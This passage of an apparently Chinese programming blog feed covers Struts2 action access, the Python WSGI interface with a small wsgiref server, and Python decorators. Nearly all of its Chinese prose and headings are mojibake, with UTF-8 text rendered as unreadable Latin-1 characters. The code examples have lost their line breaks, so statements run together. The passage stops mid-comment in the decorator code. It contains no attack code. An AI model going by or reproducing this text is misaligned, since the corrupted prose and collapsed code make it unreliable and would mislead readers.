MacKenzieäº2000å¹´9æœˆåˆ›é€ ï¼š[1]</p></blockquote><blockquote><p>â€œæˆ‘ä»¬æƒ³çŸ¥é“ä¸ºä»€ä¹ˆäººä»¬å¦‚æ­¤åå¯¹åœ¨ä»–ä»¬çš„ç³»ç»Ÿä¸­ä½¿ç”¨å¸¸è§„ç‰©ä½“ï¼Œå¹¶å¾—å‡ºç»“è®ºè®¤ä¸ºè¿™æ˜¯å› ä¸ºç®€å•çš„ç‰©ä½“ç¼ºä¹ä¸€ä¸ªå¥‡ç‰¹çš„åå­—ã€‚æ‰€ä»¥æˆ‘ä»¬ç»™äº†ä»–ä»¬ä¸€ä¸ªï¼Œå®ƒå¾ˆå¥½åœ°è¢«æ•è·äº†ã€‚â€ [1]</p></blockquote><blockquote><p>æœ¯è¯­â€œPOJOâ€æœ€åˆè¡¨ç¤ºJavaå¯¹è±¡ï¼Œå®ƒä¸éµå¾ªä»»ä½•ä¸»è¦çš„Javaå¯¹è±¡æ¨¡å‹ï¼Œçº¦å®šæˆ–æ¡†æ¶; ç°åœ¨ï¼Œâ€œPOJOâ€ä¹Ÿå¯ä»¥ç”¨ä½œâ€œPlain Old JavaScript Objectâ€ çš„é¦–å­—æ¯ç¼©å†™è¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯¥æœ¯è¯­è¡¨ç¤ºç±»ä¼¼è°±ç³»çš„JavaScriptå¯¹è±¡ã€‚[2]</p></blockquote><blockquote><p>æœ¯è¯­ç»§ç»­æ—§çš„æ¡æ¬¾å¯¹äºä¸ä½¿ç”¨èŠ±å“¨çš„æ–°åŠŸèƒ½ï¼Œå¦‚POTSï¼ˆæŠ€æœ¯å‹æ™®é€šè€å¼ç”µè¯æœåŠ¡çš„ï¼‰ç”µè¯æ³¢å¾·ï¼ˆæ™®é€šæ—§æ–‡æ¡£ä¸­ï¼‰çš„Perlã€‚ä¸.NETæ¡†æ¶ä¸Šçš„POJOç›¸å½“çš„æ˜¯Plain Old CLR Objectï¼ˆPOCOï¼‰ã€‚[3]å¯¹äºPHPï¼Œå®ƒæ˜¯Plain Old PHP Objectï¼ˆPOPOï¼‰ã€‚[4] [5]</p></blockquote><blockquote><p>POJOç°è±¡æœ€æœ‰å¯èƒ½è·å¾—å¹¿æ³›æ¥å—ï¼Œå› ä¸ºéœ€è¦ä¸€ä¸ªä¸å¤æ‚å¯¹è±¡æ¡†æ¶å½¢æˆå¯¹æ¯”çš„é€šç”¨ä¸”æ˜“äºç†è§£çš„æœ¯è¯­</p></blockquote><h2 id="Actionç±»å®ç°Actionæ¥å£"><a href="#Actionç±»å®ç°Actionæ¥å£" class="headerlink" title="Actionç±»å®ç°Actionæ¥å£"></a>Actionç±»å®ç°Actionæ¥å£</h2><p><img src="" alt="å®ç°æ¥å£"></p><h1 id="è®¿é—®Actionçš„ä¸åŒæ–¹å¼"><a href="#è®¿é—®Actionçš„ä¸åŒæ–¹å¼" class="headerlink" title="è®¿é—®Actionçš„ä¸åŒæ–¹å¼"></a>è®¿é—®Actionçš„ä¸åŒæ–¹å¼</h1><h2 id="é€šè¿‡actionæ ‡ç­¾çš„methodå±æ€§è®¿é—®"><a href="#é€šè¿‡actionæ ‡ç­¾çš„methodå±æ€§è®¿é—®" class="headerlink" title="é€šè¿‡actionæ ‡ç­¾çš„methodå±æ€§è®¿é—®"></a>é€šè¿‡actionæ ‡ç­¾çš„methodå±æ€§è®¿é—®</h2><p><img src="" alt="actionmethod"><br><strong>Actionç±»ä¸­æœ‰å››ä¸ªä¸åŒçš„æ–¹æ³•,å½“æˆ‘ä»¬è®¿é—®æŸä¸ªæ–¹æ³•çš„æ—¶å€™æ‰§è¡ŒæŸä¸ªaction</strong><br><strong>åœ¨struts.xmlä¸­çš„ä½¿ç”¨actionæ ‡ç­¾çš„methodå±æ€§è®¿é—®action</strong></p><h2 id="é€šè¿‡é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œactionçš„è®¿é—®"><a href="#é€šè¿‡é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œactionçš„è®¿é—®" class="headerlink" title="é€šè¿‡é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œactionçš„è®¿é—®"></a>é€šè¿‡é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œactionçš„è®¿é—®</h2><p><img src="" alt="é€šé…ç¬¦çš„è®¿é—®"></p><h2 id="åŠ¨æ€è®¿é—®"><a href="#åŠ¨æ€è®¿é—®" class="headerlink" title="åŠ¨æ€è®¿é—®"></a>åŠ¨æ€è®¿é—®</h2><p><strong>é€šè¿‡ä½¿ç”¨struts.xmlçš„æ–¹æ³•ä¿®æ”¹Strutsé…ç½®å¼€å¯åŠ¨æ€æ–¹æ³•è®¿é—®</strong></p><pre><code>&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;</code></pre><p>ä¹¦å†™actionæ ‡ç­¾</p><pre><code>&lt;action name=&quot;customer&quot; class=&quot;test.demo3.CustomerAction&quot;&gt;&lt;/action&gt;</code></pre><p><strong>ç„¶åå†JSPé¡µé¢é…ç½®è®¿é—®è·¯å¾„</strong></p><pre><code>    &lt;!--å‰é¢å†™ä¸ŠActionnameçš„åç§°ä¸­é—´å†™ä¸ª!,åé¢æ˜¯æ–¹æ³•çš„åç§° --&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!find.action&quot;&gt;æŸ¥è¯¢å®¢æˆ·&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!update.action&quot;&gt;ä¿®æ”¹å®¢æˆ·&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!delete.action&quot;&gt;åˆ é™¤å®¢æˆ·&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!save.action&quot;&gt;ä¿å­˜å®¢æˆ·&lt;/a&gt;</code></pre><p><strong>JSPé¡µé¢ä¹¦å†™æ–¹æ³•:å‰é¢å†™ä¸ŠActionnameçš„åç§°ä¸­é—´å†™ä¸ª!,åé¢æ˜¯æ–¹æ³•çš„åç§°</strong></p><p><img src="" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PythonWebç¼–ç¨‹WSGI</title>
      <link href="/2018/12/05/pythonweb-bian-cheng-wsgi/"/>
      <url>/2018/12/05/pythonweb-bian-cheng-wsgi/</url>
      
        <content type="html"><![CDATA[<h1 id="åŠ¨æ€ç½‘ç«™å’Œé™æ€ç½‘ç«™çš„åŒºåˆ«"><a href="#åŠ¨æ€ç½‘ç«™å’Œé™æ€ç½‘ç«™çš„åŒºåˆ«" class="headerlink" title="åŠ¨æ€ç½‘ç«™å’Œé™æ€ç½‘ç«™çš„åŒºåˆ«"></a>åŠ¨æ€ç½‘ç«™å’Œé™æ€ç½‘ç«™çš„åŒºåˆ«</h1><p>æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„ç½‘ç«™å¯ä»¥åˆ†ä¸ºé™æ€ç½‘ç«™å’ŒåŠ¨æ€ç½‘ç«™,æœ¬åšå®¢å°±æ˜¯ä¸€ä¸ªé™æ€ç½‘ç«™,</p><p>é™æ€ç½‘ç«™:</p><p><strong>StaticWebsite</strong></p><blockquote><p>æ— è®ºä½•æ—¶è®¿é—®å®ƒï¼Œé™æ€ç½‘é¡µéƒ½ä¼šæ˜¾ç¤ºå®Œå…¨ç›¸åŒçš„ä¿¡æ¯ã€‚é™æ€ç½‘é¡µä¸å¿…æ˜¯ç®€å•çš„çº¯æ–‡æœ¬ã€‚ä»–ä»¬å¯ä»¥æä¾›è¯¦ç»†çš„å¤šåª’ä½“è®¾è®¡ç”šè‡³è§†é¢‘ã€‚ä½†æ˜¯ï¼Œæ¯æ¬¡è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œæ¯ä¸ªè®¿é—®è¯¥é¡µé¢çš„è®¿é—®è€…éƒ½ä¼šå—åˆ°å®Œå…¨ç›¸åŒçš„æ–‡æœ¬ï¼Œå¤šåª’ä½“è®¾è®¡æˆ–è§†é¢‘çš„æ¬¢è¿ï¼Œç›´åˆ°æ‚¨æ›´æ”¹è¯¥é¡µé¢çš„æºä»£ç ã€‚</p></blockquote><p>åŠ¨æ€ç½‘ç«™:</p><p><strong>DynamicWebsite</strong></p><blockquote><p>åŠ¨æ€ç½‘é¡µèƒ½å¤Ÿä»åŒä¸€æºä»£ç æ–‡ä»¶ä¸ºä¸åŒçš„è®¿é—®è€…ç”Ÿæˆä¸åŒçš„å†…å®¹ã€‚ç½‘ç«™å¯ä»¥æ ¹æ®è®¿é—®è€…ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨æ˜¾ç¤ºä¸åŒçš„å†…å®¹ï¼Œæ— è®ºæ˜¯ä½¿ç”¨PCè¿˜æ˜¯ç§»åŠ¨è®¾å¤‡ï¼Œç”šè‡³æ˜¯å¼•ç”¨è®¿é—®è€…çš„æ¥æºã€‚åŠ¨æ€Webé¡µé¢ä¸ä¸€å®šæ¯”é™æ€Webé¡µé¢æ›´å¥½ã€‚è¿™ä¸¤ä¸ªåªæ˜¯ç”¨äºä¸åŒçš„ç›®çš„ã€‚</p></blockquote><p><strong>ç›´ç™½çš„æ¥è¯´å°±æ˜¯é™æ€ç½‘ç«™çš„é¡µé¢æ˜¯ä¸€æˆä¸å˜çš„,å¦‚æœéœ€è¦æ”¹å˜éœ€è¦ä¿®æ”¹ç½‘ç«™çš„æºç .åŠ¨æ€ç½‘ç«™æ˜¯è®¿é—®ä¸åŒé¡µé¢æ ¹æ®ç›¸åŒçš„é¡µé¢æºç å¯¹ä¸åŒçš„ç”¨æˆ·å±•ç¤ºä¸åŒçš„å†…å®¹å¹¶ä¸”è¿˜å¯ä»¥ä¸æ•°æ®åº“äº¤äº’ä»¥å‘ç”¨æˆ·æ˜¾ç¤ºä¸´æ—¶ä¿¡æ¯.</strong></p><p>é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨Pythonç¼–å†™åŠ¨æ€ç½‘ç«™å‘¢?</p><p>Pythonä¸­æœ‰å¾ˆå¤šä¼˜ç§€çš„Webæ¡†æ¶,å¤§å®¶ç†ŸçŸ¥çš„Django,Flaskéƒ½æ˜¯åˆ›å»ºåŠ¨æ€ç½‘ç«™çš„ä¼˜ç§€æ¡†æ¶.</p><h2 id="WebæœåŠ¡å™¨å¯¹é™æ€è¯·æ±‚å’ŒåŠ¨æ€è¯·æ±‚çš„å¤„ç†æ–¹å¼"><a href="#WebæœåŠ¡å™¨å¯¹é™æ€è¯·æ±‚å’ŒåŠ¨æ€è¯·æ±‚çš„å¤„ç†æ–¹å¼" class="headerlink" title="WebæœåŠ¡å™¨å¯¹é™æ€è¯·æ±‚å’ŒåŠ¨æ€è¯·æ±‚çš„å¤„ç†æ–¹å¼"></a>WebæœåŠ¡å™¨å¯¹é™æ€è¯·æ±‚å’ŒåŠ¨æ€è¯·æ±‚çš„å¤„ç†æ–¹å¼</h2><p>é™æ€è¯·æ±‚:</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/z4ABjBx5Gl.PD8kZLanPzXQJvO2usdyTAJVdQXhBOSs!/b/dL0AAAAAAAAA&amp;bo=AAQAAwAAAAARFyc!&amp;rf=viewer_4" alt="é™æ€è¯·æ±‚"></p><p>ç›´æ¥è·å–æ•°æ®,å¹¶è¿”å›ç»™æµè§ˆå™¨æ•°æ®</p><p>åŠ¨æ€è¯·æ±‚:</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/JxzOOVu0ZR0LMOM4.YiY3SDzAothtUCBsxrtRwQ2ij8!/b/dLwAAAAAAAAA&amp;bo=AAQAAwAAAAARBzc!&amp;rf=viewer_4" alt="åŠ¨æ€è¯·æ±‚"></p><p>WebæœåŠ¡å™¨äº¤ç»™webæ¡†æ¶å¤„ç†,webæ¡†æ¶å¤„ç†å®Œä¹‹åäº¤ç»™WebæœåŠ¡å™¨,WebæœåŠ¡å™¨å†è¿”å›ç»™æµè§ˆå™¨.</p><h2 id="æœåŠ¡å™¨è¯·æ±‚åŠ¨æ€é¡µé¢è¿‡ç¨‹"><a href="#æœåŠ¡å™¨è¯·æ±‚åŠ¨æ€é¡µé¢è¿‡ç¨‹" class="headerlink" title="æœåŠ¡å™¨è¯·æ±‚åŠ¨æ€é¡µé¢è¿‡ç¨‹"></a>æœåŠ¡å™¨è¯·æ±‚åŠ¨æ€é¡µé¢è¿‡ç¨‹</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SH1CU*8l8ZMGCayJUu7mViswwEP2ItLqZ6CTQGNFQ8U!/b/dLwAAAAAAAAA&amp;bo=mgRHAgAAAAADJ9k!&amp;rf=viewer_4" alt="æœåŠ¡å™¨è¯·æ±‚åŠ¨æ€é¡µé¢è¿‡ç¨‹"></p><h1 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h1><p>ä»€ä¹ˆæ˜¯WSGIå‘¢?WSGIæœ‰ä»€ä¹ˆç”¨å‘¢?WSGIçš„å‡ºç°è§£å†³äº†ä»€ä¹ˆé—®é¢˜å‘¢?</p><p>åœ¨è®²è§£WSGIä¹‹å‰è®©æˆ‘ä»¬æƒ³ä¸€ä¸ªé—®é¢˜:</p><p>åœ¨WebæœåŠ¡å™¨ä¸Šè¿è¡Œä¸€ä¸ªDjangoåº”ç”¨æˆ–è€…Flaskåº”ç”¨,å¦‚ä½•åœ¨ä¸åšä»»ä½•æ”¹å˜çš„æƒ…å†µä¸‹é€‚åº”ä¸åŒçš„Webæ¶æ„å‘¢?</p><p>åœ¨ä»¥å‰(2003å¹´)é€‰æ‹©Pythonwebæ¶æ„ä¼šå—åˆ¶äºå¯ç”¨çš„WebæœåŠ¡å™¨,å°±æ˜¯è¯´æœ‰çš„æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨PythonWebæ¶æ„æœ‰çš„æœåŠ¡å™¨ä¸èƒ½ä½¿ç”¨.</p><p>WSGIçš„å‡ºç°å°±è§£å†³äº†è¿™æ ·çš„é—®é¢˜.</p><p>WSGIå…è®¸å¼€å‘è€…å°†é€‰æ‹©webæ¡†æ¶å’ŒwebæœåŠ¡å™¨åˆ†å¼€ã€‚å¯ä»¥æ··åˆåŒ¹é…webæœåŠ¡å™¨å’Œwebæ¡†æ¶ï¼Œé€‰æ‹©ä¸€ä¸ªé€‚åˆçš„é…å¯¹æ¯”å¦‚å¯ä»¥åœ¨Nginxä¸Šè¿è¡ŒDjangoæˆ–è€…Flask.</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/PoM84ROFDgB2mWFgyVblKqIpXO7y00gQvh60d6EiOFM!/b/dLkAAAAAAAAA&amp;bo=MgTdAQAAAAADF9g!&amp;rf=viewer_4" alt=""></p><blockquote><p>WSGIæ˜¯WebæœåŠ¡å™¨ç½‘å…³æ¥å£ã€‚å®ƒæ˜¯ä¸€ä¸ªæè¿°WebæœåŠ¡å™¨å¦‚ä½•ä¸Webåº”ç”¨ç¨‹åºé€šä¿¡çš„è§„èŒƒã€‚å®ƒæ˜¯Pythonçš„æ¡†æ¶ã€‚å®ƒæœ€åˆæ˜¯åœ¨2003å¹´æŒ‡å®šçš„.WSGIå·²ç»æˆä¸ºPython Webåº”ç”¨ç¨‹åºå¼€å‘çš„æ ‡å‡†ã€‚WSGIå·²åœ¨PEP 3333ä¸­æŒ‡å®š ã€‚æ‘˜è¦è¯´ï¼šâ€œæœ¬æ–‡æ¡£è§„å®šäº†WebæœåŠ¡å™¨å’ŒPython Webåº”ç”¨ç¨‹åºæˆ–æ¡†æ¶ä¹‹é—´çš„æ ‡å‡†æ¥å£ï¼Œä»¥ä¿ƒè¿›å„ç§WebæœåŠ¡å™¨ä¸Šçš„Webåº”ç”¨ç¨‹åºå¯ç§»æ¤æ€§ã€‚</p></blockquote><p><strong>webæœåŠ¡å™¨å¿…é¡»å…·å¤‡WSGIæ¥å£ï¼Œæ‰€æœ‰çš„ç°ä»£Python Webæ¡†æ¶éƒ½å·²å…·å¤‡WSGIæ¥å£ï¼Œå®ƒè®©ä½ ä¸å¯¹ä»£ç ä½œä¿®æ”¹å°±èƒ½ä½¿æœåŠ¡å™¨å’Œç‰¹ç‚¹çš„webæ¡†æ¶ååŒå·¥ä½œã€‚</strong></p><h1 id="å®šä¹‰WSGIæ¥å£"><a href="#å®šä¹‰WSGIæ¥å£" class="headerlink" title="å®šä¹‰WSGIæ¥å£"></a>å®šä¹‰WSGIæ¥å£</h1><p>å®šä¹‰WSGIéå¸¸ç®€å•,åªéœ€è¦æˆ‘<strong>ä»¬å®ç°ä¸€ä¸ªå‡½æ•°,å°±å¯ä»¥å“åº”æœåŠ¡å™¨çš„HTTPè¯·æ±‚.</strong></p><pre><code>from wsgiref.simple_server import make_serverdef application(environ, start_response):    start_response(&quot;200 OK&quot;, [(&quot;Content-type&quot;, &quot;text/plain&quot;)])    return [&quot;Hello WSGI&quot;.encode(&quot;utf-8&quot;)]server = make_server(&#39;localhost&#39;, 8080, application)server.serve_forever()</code></pre><p>Output</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/qmR*z1bpj7eElIFfoYsLjbJHLgvgt6HNKae18avQgEE!/b/dL8AAAAAAAAA&amp;bo=3ASUAAAAAAADF34!&amp;rf=viewer_4" alt=""></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/DFwkgmOE70C0GgLtq.R0KYy22i13maMyJH8fKvl6Ml0!/b/dDcBAAAAAAAA&amp;bo=fgKXAAAAAAADB8k!&amp;rf=viewer_4" alt=""></p><p>è¿™é‡Œçš„<strong>å‡½æ•°application</strong>å°±æ˜¯ç¬¦åˆWSGIæ ‡å‡†çš„ä¸€ä¸ªHTTPå¤„ç†å‡½æ•°,å®ƒæ¥æ”¶ä¸¤ä¸ªå‚æ•°:</p><p><strong>environ:ä¸€ä¸ªåŒ…å«æ‰€æœ‰HTTPè¯·æ±‚ä¿¡æ¯çš„dictå¯¹è±¡</strong></p><p><strong>start_response:ä¸€ä¸ªå‘é€ç»™æœåŠ¡å™¨çš„HTTPå“åº”çš„å‡½æ•°,start_responseå¿…é¡»æ˜¯å¯è°ƒç”¨çš„ï¼Œå…·æœ‰ä¸‰ä¸ªå‚æ•°ï¼šstatusï¼Œresponse_headersï¼Œexc_info = None</strong></p><p>æ•´ä¸ªapplication()å‡½æ•°æœ¬èº«æ²¡æœ‰æ¶‰åŠåˆ°ä»»ä½•è§£æHTTPçš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>æŠŠåº•å±‚webæœåŠ¡å™¨è§£æéƒ¨åˆ†å’Œåº”ç”¨ç¨‹åºé€»è¾‘éƒ¨åˆ†è¿›è¡Œäº†åˆ†ç¦».è¿™æ ·å¼€å‘è€…å°±å¯ä»¥ä¸“å¿ƒåšä¸€ä¸ªé¢†åŸŸäº†</strong></p><p>å¦‚ä½•è°ƒ<strong>ç”¨è¿™ä¸ªapplicationå‡½æ•°?å¦‚æœè‡ªå·±è°ƒç”¨çš„è¯ä¸¤ä¸ªé‡è¦çš„å‚æ•°environ,start_responseæ— æ³•æä¾›,è¿”å›çš„å“åº”ä¹Ÿæ— æ³•å‘ç»™æµè§ˆå™¨.æ‰€ä»¥è¯´application()å‡½æ•°å¿…é¡»ç”±WSGIæœåŠ¡å™¨æ¥è°ƒç”¨.</strong></p><p>è¿™é‡Œæ˜¯æˆ‘è‡ªå·±å†™çš„WebæœåŠ¡å™¨ä¸­è°ƒç”¨applicationçš„æƒ…å†µ</p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl1FgUNv/3DPwBOSQWgdo7H1VgBVB*16tS5lMccNvjPsx2FQi.K8!/m/dL0AAAAAAAAAnull&amp;bo=4QSmAgAAAAADB2M!&amp;rf=photolist&amp;t=5" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WSGI </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pythonè£…é¥°å™¨</title>
      <link href="/2018/12/04/python-zhuang-shi-qi/"/>
      <url>/2018/12/04/python-zhuang-shi-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="ç†è§£Pythonè£…é¥°å™¨çš„å‰æ"><a href="#ç†è§£Pythonè£…é¥°å™¨çš„å‰æ" class="headerlink" title="ç†è§£Pythonè£…é¥°å™¨çš„å‰æ"></a>ç†è§£Pythonè£…é¥°å™¨çš„å‰æ</h1><h2 id="è£…é¥°å™¨æ˜¯ä»€ä¹ˆ"><a href="#è£…é¥°å™¨æ˜¯ä»€ä¹ˆ" class="headerlink" title="è£…é¥°å™¨æ˜¯ä»€ä¹ˆ"></a>è£…é¥°å™¨æ˜¯ä»€ä¹ˆ</h2><p>Pythonä¸­çš„è£…é¥°å™¨æ˜¯<strong>ä»»ä½•å¯è°ƒç”¨çš„Pythonå¯¹è±¡</strong>,ç”¨äº<strong>ä¿®æ”¹å‡½æ•°æˆ–ç±»</strong>,å¯¹äºå‡½æ•°â€™funcâ€™å’Œç±»â€™Câ€™çš„<strong>å¼•ç”¨</strong>è¢«ä¼ é€’ç»™è£…é¥°å™¨,<strong>è£…é¥°å™¨è¿”å›ä¿®æ”¹çš„å‡½æ•°æˆ–è€…ç±»</strong>.ä¿®æ”¹åçš„å‡½æ•°æˆ–ç±»é€šå¸¸åŒ…å«å¯¹åŸå§‹å‡½æ•°â€™funcâ€™æˆ–ç±»â€™Câ€™çš„<strong>è°ƒç”¨</strong>.</p><p>ç®€å•æ¥è¯´:<br>è£…é¥°å™¨æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°,æ·»åŠ ä¸€äº›åŠŸèƒ½å¹¶è¿”å›å®ƒ.</p><p>è£…é¥°å™¨åœ¨è¿›è¡Œè£…é¥°çš„è¿‡ç¨‹ç±»ä¼¼äºç°å®ç”Ÿæ´»ä¸­ç»™ä¸€ä¸ªä¸œè¥¿è¿›è¡ŒåŒ…è£…,è£…é¥°å™¨å……å½“å¤–åŒ…è£…,è¢«è£…é¥°çš„ç‰©å“æ€§è´¨ä¸å˜,åªä¸è¿‡å˜å¾—æ›´åŠ å¥½çœ‹äº†.</p><h2 id="Pythonä¸­çš„å¯¹è±¡"><a href="#Pythonä¸­çš„å¯¹è±¡" class="headerlink" title="Pythonä¸­çš„å¯¹è±¡"></a>Pythonä¸­çš„å¯¹è±¡</h2><p>Pythonä¸­çš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å¯¹è±¡,æˆ‘ä»¬å®šä¹‰çš„<strong>åç§°åªæ˜¯ç»‘å®šåˆ°è¿™äº›å¯¹è±¡çš„æ ‡è¯†ç¬¦</strong>.<strong>å‡½æ•°ä¹Ÿä¸ä¾‹å¤–</strong>,<strong>å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡</strong>.</p><p>é€šè¿‡ä¸‹é¢çš„ä¾‹å­,ç†è§£å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡,</p><pre><code>def first(name):    print(f&#39;My name is:{name}&#39;)first(&quot;å¼ ä¸‰&quot;)second = first      # å°†å˜é‡secondç»‘å®šåˆ°firstå‡½æ•°å¯¹è±¡è¿™æ—¶å€™firstå’Œsecondéƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡second(&quot;æå››&quot;)</code></pre><p>åœ¨è¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°first,æ¥ä¸‹æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°,ä¼ é€’ç»™firstå‡½æ•°ä¸€ä¸ªå®å‚â€å¼ ä¸‰â€,ç„¶åæˆ‘ä»¬åˆå°†firstå‡½æ•°çš„å¼•ç”¨èµ‹å€¼ç»™äº†second,è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å½“æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå‡½æ•°ä¹‹å<strong>æ‰§è¡Œå‡½æ•°çš„æ—¶å€™ä½¿ç”¨å‡½æ•°å()</strong>,å‡½æ•°ååé¢ä¸å¸¦æ‹¬å·è¡¨ç¤º,å¯¹è¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨(å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡).</p><h2 id="å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’"><a href="#å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’" class="headerlink" title="å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’"></a>å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’</h2><p>æ—¢ç„¶<strong>å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡</strong>çš„è¯,<strong>å‡½æ•°ä¹Ÿå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°</strong>,<br>ç±»ä¼¼çš„ä¾‹å­æ˜¯pythonä¸­çš„map(),filter()â€¦å‡½æ•°,<br>ä»–ä»¬éƒ½å¯ä»¥æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºä»–ä»¬çš„ä¸€ä¸ªå‚æ•°.</p><p>å°†å‡½æ•°çš„å¼•ç”¨ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°çš„ä¾‹å­:</p><pre><code>def inc(x):    return x + 1def dec(x):    return x - 1def operate(func,x):    result = func(x)    return resultresult = operate(inc,10)result2 = operate(dec,10)print(result)print(result2)</code></pre><p><strong>Pythonä¸­çš„æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡</strong>,<strong>å‡ ä¹æ‰€æœ‰çš„ä¸œè¥¿éƒ½æœ‰å±æ€§å’Œæ–¹æ³•</strong>,<br>å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡,æ‰€ä»¥ä»–ä»¬ä¹Ÿæœ‰åƒå…¶ä»–å¯¹è±¡ä¸€æ ·çš„å±æ€§,<br><strong>æ‰€æœ‰å‡½æ•°éƒ½æœ‰ä¸€äº›å†…ç½®å±æ€§</strong>:<br>__doc__,__name__,__module__<br>å½“ç„¶<strong>å‡½æ•°ä¹Ÿå¯ä»¥æœ‰è‡ªå·±çš„è‡ªå®šä¹‰å±æ€§</strong>.</p><p>ä½¿ç”¨å‡½æ•°çš„å†…ç½®å±æ€§æŸ¥çœ‹å‡½æ•°çš„åå­—.</p><pre><code>def funcA():    return &#39;A&#39;def funcB(A):    return f&#39;å‡½æ•°Açš„__name__å±æ€§:{A.__name__}&#39;print(funcB(funcA))</code></pre><p>OutPut</p><pre><code>å‡½æ•°Açš„__name__å±æ€§:funcA</code></pre><h2 id="ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°"><a href="#ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°" class="headerlink" title="ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°"></a>ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°</h2><pre><code>def is_caller():    def is_returned():        print(&#39;Hello&#39;)    return is_returnednew = is_caller()       # è°ƒç”¨å¤–éƒ¨å‡½æ•°,è¿”å›å†…éƒ¨å‡½æ•°çš„å¼•ç”¨,å°†è¿™ä¸ªå¼•ç”¨èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡newnew()           #é€šè¿‡new,è°ƒç”¨å†…éƒ¨å‡½æ•°print(new.__name__)         # é€šè¿‡ä½¿ç”¨å‡½æ•°çš„å†…ç½®å±æ€§__name__æŸ¥çœ‹è°ƒç”¨çš„æ˜¯å“ªä¸ªå‡½æ•°</code></pre><p>OutPut</p><pre><code>Hellois_returned</code></pre><h1 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a>è£…é¥°å™¨</h1><p>å®šä¹‰ä¸€ä¸ªç®€å•çš„è£…é¥°å™¨</p><pre><code># -*- coding: utf-8 -*-&quot;&quot;&quot;   File Name:è£…é¥°å™¨å®ç°   Dateï¼š2018/12/3   Change Activity:2018/12/3   Description:   å®ç°ä¸€ä¸ªè£…é¥°å™¨,ä½¿ç”¨p_docorateè£…é¥°get_text   p_docorateä»¥get_textä¸ºå‚æ•°,ç”Ÿæˆä¸€ä¸ªå‡½æ•°my_get   å¢åŠ åŸå‡½æ•°çš„åŠŸèƒ½,ç„¶åè¿”å›ç”Ÿæˆçš„å‡½æ•°.&quot;&quot;&quot;def p_docorate(func):    def func_wrapper(name):        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return func_wrapper@p_docorate # ç­‰ä»·äº:p_docorate(get_text)def get_text(name):    return f&#39;ä½ å–œæ¬¢{name}&#39;my_get = p_docorate(get_text)print(my_get(&quot;å¼ ä¸‰&quot;))print(get_text.__name__)        # 